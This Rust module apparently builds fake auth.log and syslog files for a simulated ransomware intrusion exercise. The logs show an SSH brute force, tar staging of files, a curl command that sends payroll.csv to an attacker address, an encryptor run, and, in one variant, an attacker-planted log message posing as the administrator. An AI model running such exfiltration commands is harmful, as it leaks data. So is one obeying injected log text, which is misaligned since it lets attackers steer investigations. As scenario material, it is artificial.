//! The attacker's trail in the victim's logs.
//!
//! An SSH brute force from 203.0.113.45 that ends in a login, the staging copy of the
//! exfiltration targets, a failed beacon and the encryptor. In `logpoison` the attacker also
//! leaves a `logger` message posing as the administrator.

use std::fmt::Write as _;
use std::fs;
use std::path::Path;

use anyhow::Context as _;
use jiff::Timestamp;

use crate::share::{Detonation, NOTE_NAME};
use crate::variant::{LOG_INJECTION, Variant};

/// The victim's hostname.
const HOST: &str = "acme-fs";
/// The attacker's address (TEST-NET-3, never routable).
const ATTACKER: &str = "203.0.113.45";
/// Where the logs say the attacker's encryptor ran from.
const ENCRYPTOR: &str = "/var/tmp/.cache/encryptor";

/// One log line.
struct Entry {
    /// Seconds before the detonation.
    before: i64,
    /// The syslog tag, such as `sshd[2140]`.
    tag: String,
    /// The message after the tag.
    message: String,
}

/// Build an [`Entry`].
fn entry(before: i64, tag: impl Into<String>, message: impl Into<String>) -> Entry {
    Entry {
        before,
        tag: tag.into(),
        message: message.into(),
    }
}

/// An auditd-style record of root running `cmdline` in the attacker's session.
fn exec(before: i64, pid: u32, exe: &str, cmdline: &str) -> Entry {
    entry(
        before,
        format!("audit[{pid}]"),
        format!("type=EXECVE uid=0 auid=1003 ses=42 exe=\"{exe}\" cmdline=\"{cmdline}\""),
    )
}

/// Write `auth.log` and `syslog` into `logs` for `detonation`, timed to end at `at`.
///
/// # Errors
/// Fails when a log file can't be written.
pub(crate) fn write(
    logs: &Path,
    share: &Path,
    drop: &Path,
    at: Timestamp,
    detonation: &Detonation,
) -> anyhow::Result<()> {
    let (share, drop) = (share.display(), drop.display());
    let pack = format!("tar -C {share} -cf - {}", detonation.exfiltrated.join(" "));
    let unpack = format!("tar -C {drop} -xf -");
    let beacon = format!(
        "curl -s -m 5 --data-binary @{drop}/payroll.csv http://{ATTACKER}:8443/b?id=ACME-7Q2-0451"
    );
    let encrypt = format!("{ENCRYPTOR} --share {share}");

    let mut auth = brute_force();
    for (before, command) in [
        (191, format!("{pack} | {unpack}")),
        (96, beacon.clone()),
        (31, encrypt.clone()),
    ] {
        auth.push(entry(
            before,
            "sudo",
            format!(
                "  backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/bash -c '{command}'"
            ),
        ));
        auth.push(entry(
            before,
            "sudo",
            "pam_unix(sudo:session): session opened for user root(uid=0) by backup(uid=1003)",
        ));
    }

    let mut syslog = vec![
        entry(
            711,
            "systemd[1]",
            "Started session-42.scope - Session 42 of User backup.",
        ),
        entry(
            420,
            "systemd[1]",
            "Starting apt-daily.service - Daily apt download activities...",
        ),
        exec(190, 2201, "/usr/bin/tar", &pack),
        exec(190, 2202, "/usr/bin/tar", &unpack),
        exec(95, 2215, "/usr/bin/curl", &beacon),
        entry(
            90,
            "audit[2215]",
            format!(
                "type=SYSCALL exe=\"/usr/bin/curl\" syscall=connect success=no exit=-101 (ENETUNREACH) daddr={ATTACKER} dport=8443"
            ),
        ),
        exec(30, 2230, ENCRYPTOR, &encrypt),
        entry(
            30,
            "encryptor[2230]",
            format!("LOCKSTAR 3.1 started; target {share}"),
        ),
        entry(
            0,
            "encryptor[2230]",
            format!(
                "locked {} files; note written to {share}/{NOTE_NAME}, wallpaper to {share}/{}",
                detonation.locked.len(),
                detonation.wallpaper
            ),
        ),
    ];
    syslog.extend(poison(detonation.variant));

    write_log(&logs.join("auth.log"), at, &auth)?;
    write_log(&logs.join("syslog"), at, &syslog)
}

/// The attacker's own session (auid 1003) posing as the administrator with `logger`, in
/// `logpoison`; nothing otherwise.
fn poison(variant: Variant) -> Vec<Entry> {
    if variant != Variant::Logpoison {
        return Vec::new();
    }
    vec![
        exec(
            0,
            2236,
            "/usr/bin/logger",
            "logger -t it-admin -f /var/tmp/.cache/notice.txt",
        ),
        entry(0, "it-admin[2236]", LOG_INJECTION),
    ]
}

/// Fourteen failed SSH logins over two minutes, then the `backup` account gets in.
fn brute_force() -> Vec<Entry> {
    const USERS: [&str; 14] = [
        "admin", "root", "oracle", "ubuntu", "test", "postgres", "backup", "admin", "root",
        "backup", "git", "backup", "support", "backup",
    ];
    let attempts = (714_i64..=840)
        .rev()
        .step_by(9)
        .zip((40_133_u32..).step_by(137))
        .zip(2101_u32..);
    let mut entries = Vec::with_capacity(USERS.len() * 2 + 3);
    for (user, ((before, port), pid)) in USERS.into_iter().zip(attempts) {
        let tag = format!("sshd[{pid}]");
        let target = if matches!(user, "root" | "backup") {
            user.to_owned()
        } else {
            entries.push(entry(
                before,
                tag.as_str(),
                format!("Invalid user {user} from {ATTACKER} port {port}"),
            ));
            format!("invalid user {user}")
        };
        entries.push(entry(
            before,
            tag,
            format!("Failed password for {target} from {ATTACKER} port {port} ssh2"),
        ));
    }
    entries.extend([
        entry(
            712,
            "sshd[2140]",
            format!("Accepted password for backup from {ATTACKER} port 51122 ssh2"),
        ),
        entry(
            711,
            "sshd[2140]",
            "pam_unix(sshd:session): session opened for user backup(uid=1003) by (uid=0)",
        ),
        entry(711, "systemd-logind[402]", "New session 42 of user backup."),
    ]);
    entries
}

/// Write `entries` to `path` as RFC 3339 syslog lines.
///
/// # Errors
/// Fails when a line's time is out of range or the file can't be written.
fn write_log(path: &Path, at: Timestamp, entries: &[Entry]) -> anyhow::Result<()> {
    let mut text = String::new();
    for Entry {
        before,
        tag,
        message,
    } in entries
    {
        let time = Timestamp::from_second(at.as_second().saturating_sub(*before))
            .context("log time out of range")?;
        writeln!(
            text,
            "{} {HOST} {tag}: {message}",
            time.strftime("%Y-%m-%dT%H:%M:%S+00:00")
        )
        .context("formatting a log line")?;
    }
    fs::write(path, text).with_context(|| format!("writing {}", path.display()))
}
